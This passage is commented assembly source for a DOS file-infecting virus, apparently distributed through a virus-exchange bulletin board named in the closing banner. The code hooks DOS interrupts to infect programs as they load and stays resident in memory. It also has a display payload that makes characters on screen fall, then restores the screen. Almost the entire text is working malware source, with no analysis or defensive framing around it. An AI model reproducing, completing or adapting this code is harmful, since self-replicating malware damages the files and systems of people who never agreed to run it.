	MOV	AX,[SI+7]		; Get host segment
	MOV	CX,ES			; Get relevant segment
	CMP	AX,CX			; Are they the same?
	POP	CX
	POP	DS
	POP	AX
	JNE	BP0670			; Branch if different
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	CMP	AH,49H			; Free memory?
	JE	BP0670			; Branch if yes
	ADD	BX,01D0H		; Add length of installed segment
BP0670:	POP	DS
	JMP	BP0710			; Pass on to old Int 21H

	; Program termination (Int 20H, or functions 0 or 4CH)

BP0680:	XOR	DX,DX			; Nothing to keep
BP0690:	CALL	BP0640			; Get relocation constant in SI
	PUSH	ES
	PUSH	DX
	CLI
	CALL	BP0590			; Reset interrupts
	STI
	POP	AX
	MOV	DX,01D0H		; Length of installed segment
	ADD	DX,AX			; Add length for host
	ADD	DX,10H			; Add PSP length (?)
	POP	ES
	POP	DS
	POP	AX
	POP	DS
	MOV	AH,31H			; Keep process function
	JMP	SHORT BP0710		; Pass on to old Int 21H

	; Interrupt 21H routine

BP0700:	CMP	AH,4CH			; \ End process function?
	JE	BP0680			; /
	CMP	AH,31H			; \ Keep process function?
	JE	BP0690			; /
	OR	AH,AH			; \ Terminate program function?
	JZ	BP0680			; /
	CMP	AH,49H			; \ Free allocated memory function?
	JE	BP0660			; /
	CMP	AH,4AH			; \ Set block function?
	JE	BP0660			; /
	CMP	AH,4BH			; \ Load function?
	JE	BP0730			; /
BP0710:	DB	0EAH			; Far jump to Int 21H
I21_OF	DW	0138DH			; Original Int 21H offset
I21_SG	DW	00291H			; Original Int 21H segment

	; Alternate Interrupt 21H - only intercept load

BP0720:	CMP	AH,4BH			; Load function?
	JNE	BP0710			; Branch if not
BP0730:	PUSH	CX
	PUSH	DX
	PUSH	ES
	PUSH	BX
	PUSH	SI
	PUSH	DI
	PUSH	BP
	CALL	BP0640			; Get relocation constant in SI
	CALL	BP0600			; Set Int 24H vector
BP0740:	STI
	TEST	BYTE PTR SWTCHB+100H,2	; Test switch two
	JNZ	BP0740			; Branch if on
	CLI
	TEST	BYTE PTR SWTCHB+100H,2	; Test switch two
	JNZ	BP0740			; Branch if on
	OR	BYTE PTR SWTCHB+100H,2	; Set on switch two
	POP	DS
	ASSUME	DS:NOTHING
	MOV	BX,DX			; Pathname pointer
	MOV	PTHDSK[SI],0FFH		; Set drive to none
	CMP	BYTE PTR [BX+01],':'	; Does pathname include drive?
	JNE	BP0750			; Branch if not
	MOV	AL,[BX]			; Get drive letter
	OR	AL,20H			; Convert to lowercase
	SUB	AL,'a'			; Convert to number
	MOV	PTHDSK[SI],AL		; Store drive
BP0750:	PUSH	SI
	PUSH	DI
	PUSH	ES
	CLD
	MOV	SI,DX			; Pathname pointer
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	DI,OFFSET DB0884+100H	; Pathname
BP0760:	LODSB				; Get a character
	STOSB				; Store a character
	OR	AL,AL			; Was that the last?
	JNZ	BP0760			; Branch if not
	POP	ES
	POP	DI
	POP	SI
	CALL	BP0380			; Process file
	CALL	BP0610			; Restore Int 24H vector
	AND	BYTE PTR CS:SWTCHB+100H,0FDH ; Set off switch two
	POP	AX
	POP	DS
	POP	BP
	POP	DI
	POP	SI
	POP	BX
	POP	ES
	POP	DX
	POP	CX
	JMP	BP0710			; Pass on to old Int 21H

	; Interrupt 27H routine

BP0770:	ADD	DX,0FH			; Round up
	MOV	CL,4			; Bits to shift
	SHR	DX,CL			; Convert to paragraphs
	JMP	BP0690			; Keep process

	; Interrupt 27H - jump to original routine

BP0780:	DB	0EAH			; Far jump to Int 27H
I27_OF	DW	05DFEH			; Original Int 27H offset
I27_SG	DW	00291H			; Original Int 27H segment

	; Interrupt 24H routine

BP0790:	PUSH	SI
	CALL	BP0800			; \ Get current location
BP0800:	POP	SI			; /
	SUB	SI,OFFSET BP0800	; Subtract offset
	OR	CRTERR[SI],1		; Set critical error flag
	POP	SI
	XOR	AL,AL			; No action
	IRET

DB086E	DB	1			; Past second line indicator
	DB	0
DB0870	DB	0			; Characters going down switch
	DB	0
SWTCHB	DB	82H			; Switch byte
			; 01 - switch one - alternate timer tick
			; 02 - switch two - processing file
			; 04 - switch three - infection count target reached
			; 08 - switch four - count two started
			; 10 - switch five - don't go to start of line
			; 20 - switch six - count two started and finished (?)
			; 40 - switch seven - count two finished
			; 80 - switch eight - video display permitted
I09_OF	DW	0			; Old Int 9 offset
I09_SG	DW	0			; Old Int 9 segment
DSPCNT	DW	0FFDCH			; Display count
I09BSY	DB	0			; Int 9 busy switch
KEYTOK	DB	0			; Keyboard token
KEYNUM	DB	0			; Key number
VIDADR	DW	0B800H			; Video RAM segment
RSTCNT	DW	0			; Restore count
FLENLO	DW	39H			; File length, low word
FLENHI	DW	0			; File length, high word
DB0884	DB	'C:\3066\HELLO.COM', 0	; Pathname
	DB	'EXE', 0, 'E', 90H DUP (0)

BP0820:	PUSH	CX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	CLD
	TEST	AL,20H			; Test switch six
	JZ	BP0850			; Branch if off
	TEST	AL,2			; Test switch two
	JNZ	BP0860			; Branch if on
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	ASSUME	DS:BOOT
	MOV	AL,BB0449		; Get current VDU mode
	MOV	CX,0B800H		; VDU RAM address
	CMP	AL,7			; Mode 7?
	JNE	BP0830			; Branch if not
	MOV	CX,0B000H		; External mono VDU RAM
	JMP	SHORT BP0840

BP0830:	CMP	AL,2			; Mode 2?
	JE	BP0840			; Branch if yes
	CMP	AL,3			; Mode 3?
	JNE	BP0860			; Branch if not
BP0840:	MOV	VIDADR+100H,CX		; Save video RAM segment
	OR	SWTCHB+100H,2		; Set on switch two
	MOV	RSTCNT+100H,0		; Set restore count to zero
	MOV	DS,CX			; Address video RAM
	MOV	CX,80*25		; Length to copy
	XOR	SI,SI			; From zero
	MOV	DI,OFFSET SIGNAT+100H	; To end of virus
	REPZ	MOVSW			; Copy video
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	MOV	AX,OFFSET BP1010+100H	; Interrupt 9 routine
	XCHG	AX,BW0024		; Install as Int 9 offset
	MOV	I09_OF+100H,AX		; Save old Int 9 offset
	MOV	AX,CS			; Get current segment
	XCHG	AX,BW0026		; Install as Int 9 segment
	MOV	I09_SG+100H,AX		; Save old Int 9 segment
BP0850:	MOV	CX,0050H		; Length of one line
	MOV	AX,80*24*2		; Last line address
	MOV	DI,OFFSET DW0005+100H	; Address line store
	REPZ	STOSW			; Store line numbers
	AND	SWTCHB+100H,7		; Set off switches above three
BP0860:	POP	DI
	POP	SI
	POP	ES
	POP	DS
	POP	CX
	JMP	BP0990			; Pass on to original Int 1CH

BP0870:	JMP	BP0820

	; Interrupt 1CH routine

BP0880:	PUSH	AX
	MOV	I09BSY+100H,0		; Clear Int 9 busy switch
	MOV	AL,SWTCHB+100H		; Get switches
	TEST	AL,60H			; Test switches six and seven
	JNZ	BP0870			; Branch if either is on
	TEST	AL,80H			; Test switch eight
	JZ	BP0910			; Branch if off
	CMP	RSTCNT+100H,0		; Is restore count off?
	JE	BP0890			; Branch if yes
	INC	RSTCNT+100H		; Increment restore count
	CMP	RSTCNT+100H,0444H	; Have we reached target (1 minute)?
	JL	BP0890			; Branch if not
	CALL	BP1030			; Video display routine
	JMP	BP0990			; Pass on to original Int 1CH

BP0890:	TEST	AL,18H			; Test switches four and five
	JZ	BP0900			; Branch if both off
	DEC	DSPCNT+100H		; Decrement display count
	JNZ	BP0900			; Branch if not finished
	AND	SWTCHB+100H,0E7H	; Set off switch three
	OR	SWTCHB+100H,40H		; Set on switch seven
	TEST	AL,8			; Test switch four
	JZ	BP0900			; Branch if off
	OR	SWTCHB+100H,20H		; Set on switch six
BP0900:	JMP	BP0990			; Pass on to original Int 1CH

BP0910:	XOR	SWTCHB+100H,1		; Toggle switch one
	TEST	AL,1			; Test previous state
	JZ	BP0900			; Branch if off
	PUSH	BX
	PUSH	SI
	PUSH	DS
	MOV	DS,VIDADR+100H		; Get video RAM segment
	XOR	SI,SI			; Start of line
	MOV	DB086E+100H,0		; Set past second line off
BP0920:	MOV	BX,DW0005[SI+100H]	; Get current line number
	OR	BX,BX			; First line?
	JZ	BP0930			; Branch if yes
	CMP	BYTE PTR [BX+SI],' '	; Is character a blank?
	JNE	BP0930			; Branch if not
	CMP	BYTE PTR [BX+SI+0FF60H],' ' ; Is char on line above a space?
	JE	BP0930			; Branch if yes
	MOV	AX,0720H		; White on black space
	XCHG	AX,[BX+SI+0FF60H]	; Swap with line above
	MOV	[BX+SI],AX		; Store new character this line
	ADD	BX,80*2			; Next line
BP0930:	CMP	BX,80*25*2		; Past last line?
	JE	BP0940			; Branch if yes
	CMP	BYTE PTR [BX+SI],' '	; Is character a blank
	JNE	BP0940			; Branch if not
	JNE	BP0970			; ?
BP0940:	MOV	BX,80*24*2		; Address last line
BP0950:	CMP	BYTE PTR [BX+SI],' '	; Is character a blank?
	JNE	BP0960			; Branch if not
	CMP	BYTE PTR [BX+SI+0FF60H],' ' ; Is char on line above a space?
	JNE	BP0970			; Branch if not
BP0960:	SUB	BX,80*2			; Previous line
	OR	BX,BX			; First line?
	JNZ	BP0950			; Branch if not
BP0970:	MOV	DW0005[SI+100H],BX	; Save current line number
	OR	WORD PTR DB086E+100H,BX	; Set past second line indicator
	ADD	SI,2			; Next character position
	CMP	SI,80*2			; End of line?
	JNE	BP0920			; Branch if not
	CMP	DB086E+100H,0		; Past second line?
	JNE	BP0980			; Branch if yes
	OR	SWTCHB+100H,80H		; Set on switch eight
	MOV	RSTCNT+100H,1		; Start restore count
BP0980:	POP	DS
	POP	SI
	POP	BX
BP0990:	POP	AX
	DB	0EAH			; Far jump to Int 1CH
I1C_OF	DW	0FF53H			; Original Int 1CH offset
I1C_SG	DW	0F000H			; Original Int 1CH segment

	; Signal end of interrupt

BP1000:	MOV	AL,20H			; \ End of interrupt
	OUT	20H,AL			; /
	POP	AX
	IRET

	; Interrupt 9 routine

BP1010:	PUSH	AX
	IN	AL,60H			; Get keyboard token
	MOV	KEYTOK+100H,AL		; Save keyboard token
	IN	AL,61H			; Get port B
	MOV	AH,AL			; Save port B
	OR	AL,80H			; \ Acknowledge keyboard
	OUT	61H,AL			; /
	MOV	AL,AH			; \ Restore Port B
	OUT	61H,AL			; /
	CMP	I09BSY+100H,0		; Test Int 9 busy switch
	MOV	I09BSY+100H,1		; Set Int 9 busy switch on
	JNE	BP1000			; Branch if on already
	MOV	AL,KEYTOK+100H		; Get keyboard token
	CMP	AL,0F0H			; \ ? discard this character
	JE	BP1000			; /
	AND	AL,7FH			; Set off top bit
	CMP	AL,KEYNUM+100H		; Same as last character?
	MOV	KEYNUM+100H,AL		; Save key number
	JE	BP1000			; Branch if same as last
	CMP	RSTCNT+100H,0		; Is restore count off?
	JE	BP1020			; Branch if yes
	MOV	RSTCNT+100H,1		; Restart restore count
BP1020:	CALL	BP1030			; Video display routine
	JMP	BP1000			; End of interrupt

	; Video display routine

BP1030:	MOV	DSPCNT+100H,0028H	; Set up short display count (2+ secs)
	TEST	SWTCHB+100H,80H		; Test switch eight
	JZ	BP1000			; Branch if off
	MOV	DB0870+100H,1		; Set character going down
	PUSH	BX
	PUSH	SI
	PUSH	DS
	MOV	DS,VIDADR+100H		; Get video RAM segment
	TEST	SWTCHB+100H,10H		; Test switch five
	JNZ	BP1070			; Branch if on
	OR	SWTCHB+100H,10H		; Set on switch five
	XOR	SI,SI			; Start of line
BP1040:	MOV	BX,80*24*2		; Address last line
BP1050:	CMP	BYTE PTR [BX+SI],' '	; Is character a blank?
	JE	BP1060			; Branch if yes
	SUB	BX,80*2			; Previous line
	JNB	BP1050			; Branch if not 
	MOV	BX,80*24*2		; Address last line
BP1060:	ADD	BX,80*2			; Next line
	MOV	DW0005[SI+100H],BX	; Save current line number
	MOV	FLENLO[SI+100H],BX	; Save last line number
	INC	SI			; \ Next character position
	INC	SI			; /
	CMP	SI,80*2			; End of line?
	JNE	BP1040			; Branch if not
BP1070:	XOR	SI,SI			; Start of line
BP1080:	CMP	DW0005[SI+100H],80*25*2	; End of display area?
	JE	BP1140			; Branch if yes
	MOV	BX,FLENLO[SI+100H]	; Get last line number
	MOV	AX,[BX+SI]		; Get current char and attributes
	CMP	AX,CS:SIGNAT[BX+SI+100H] ; Is it the same as the stored copy?
	JNE	BP1100			; Branch if not
	PUSH	BX
BP1090:	OR	BX,BX			; First line?
	JZ	BP1120			; Restore video if yes
	SUB	BX,80*2			; Previous line
	CMP	AX,CS:SIGNAT[BX+SI+100H] ; Is this line same as current?
	JNE	BP1090			; Branch if not
	CMP	AX,[BX+SI]		; Is this line the same
	JE	BP1090			; Branch if yes
	POP	BX
BP1100:	OR	BX,BX			; First line?
	JNZ	BP1110			; Character up one line if not
	MOV	WORD PTR [SI],0720H	; White on black space
	JMP	SHORT BP1130

	; Move character up one line

BP1110:	MOV	AX,[BX+SI]		; Get current char and attributes
	MOV	[BX+SI+0FF60H],AX	; Move to previous line
	MOV	WORD PTR [BX+SI],0720H	; White on black space
	SUB	FLENLO[SI+100H],80*2	; Move last line number up one
	MOV	DB0870+100H,0		; Set characters going up
	JMP	SHORT BP1140

	; Restore video

BP1120:	POP	BX
BP1130:	MOV	BX,DW0005[SI+100H]	; Get current line number
	ADD	BX,80*2			; Next line
	MOV	DW0005[SI+100H],BX	; Save new current line number
	MOV	FLENLO[SI+100H],BX	; Save last line number
BP1140:	INC	SI			; \ Next character position
	INC	SI			; /
	CMP	SI,80*2			; End of line?
	JNE	BP1080			; Branch if not
	CMP	DB0870+100H,0		; Are characters going down
	JE	BP1150			; Branch if not
	PUSH	ES
	PUSH	DI
	PUSH	CX
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	SI,OFFSET SIGNAT+100H	; From end of virus
	XOR	DI,DI			; To zero
	MOV	CX,80*25		; Length to copy
	REPZ	MOVSW			; Restore video
	MOV	DSPCNT+100H,0FFDCH	; Restart display count (60 mins)
	AND	SWTCHB+100H,4		; Set off all switches but three
	OR	SWTCHB+100H,88H		; Set on switches four and eight
	MOV	RSTCNT+100H,0		; Set restore count off
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	ASSUME	DS:BOOT
	MOV	AX,I09_OF+100H		; Get old Int 9 offset
	MOV	BW0024,AX		; Re-install Int 9 offset
	MOV	AX,I09_SG+100H		; Get old Int 9 segment
	MOV	BW0026,AX		; Re-install Int 9 segment
	POP	CX
	POP	DI
	POP	ES
BP1150:	POP	DS
	POP	SI
	POP	BX
	RET

	; Copy virus and transfer control

BP1160:	CLD
	POP	AX			; Recover return address
	SUB	AX,SI			; Subtract source offset
	ADD	AX,DI			; Add target offset
	PUSH	ES			; Push new segment
	PUSH	AX			; Push new return address
	REPZ	MOVSB			; Copy virus
	RETF				; Return to copy

	DB	090H
SIGNAT	DW	0E850H
	DB	0E2H, 003H, 08BH

ENDADR	EQU	$

CODE	ENDS

	END

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

